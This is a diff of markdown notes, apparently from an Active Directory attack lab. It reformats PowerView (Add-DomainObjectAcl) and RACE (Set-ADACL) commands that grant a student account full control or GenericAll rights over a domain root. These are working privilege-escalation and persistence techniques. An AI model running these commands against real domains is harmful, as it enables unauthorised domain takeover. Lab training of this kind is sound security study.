@@ -528,13 +528,25 @@ Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Pas
 
 
 
-- Add **FullControl** rights:
+- Add **Full Control** rights, `Powerview`:
 
 
 ```powershell
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
-• Using ActiveDirectory Module and RACE:
-Set-ADACL -SamAccountName studentuser1 -
-DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local'
--Right GenericAll -Verbose
+
+
+
+
+- Using` ActiveDirectory Module` and `RACE`:
+
+
+
+```powershell
+Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
+```
+
+
+
+
+
